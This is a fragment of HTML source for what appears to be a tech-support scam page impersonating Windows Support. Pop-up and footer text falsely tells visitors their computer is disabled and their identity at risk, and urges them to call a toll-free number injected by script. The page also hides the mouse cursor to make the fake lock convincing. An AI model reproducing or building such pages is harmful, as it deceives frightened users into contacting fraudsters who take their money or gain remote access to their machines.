...
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-217279329-6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-217279329-6');
</script>
    <!-- Bootstrap CSS -->
...
<!-- <div id="chat-box" class="bounce3" style="cursor:none;">
             <img src="logo.png"><span style="color: #fff;
        font-size: 21px;
        font-weight: 600;
        margin-left: 6px;
        position: relative;
...
<div id="poptxt">
    ...
    <img id="banner" src="fir-img-white.svg">
    <div id="disclaimer">
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;color: #fdf2f2;">
    ...
    <p>You must contact us immediately so that our engineers can walk you through the removal process over the
        phone.</p>
    <p>Contact Windows Support immediately to report this threat, prevent identity theft and unlock access to this
        device.</p>
    <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows
        Registration.</p>
    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Contact Windows Support: <strong>
 ...
 <div id="welcomeDiv" class="answer_list">
    ...
    font-size: 17px;
    opacity: .9;
    font-weight: 300;">You must contact us immediately so that our engineers can walk you through the removal process over the phone.<br>Your computer is disabled. </p>
...
<!--start sticky footer-->
 <div id="footer">
    ...
    padding-left: 0px;
    color: #fff;
    font-size: 23px;">Contact Windows Support: <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;    margin-right: 4px;"><script>document.write(phone)</script> </span> (Toll-Free)</span>
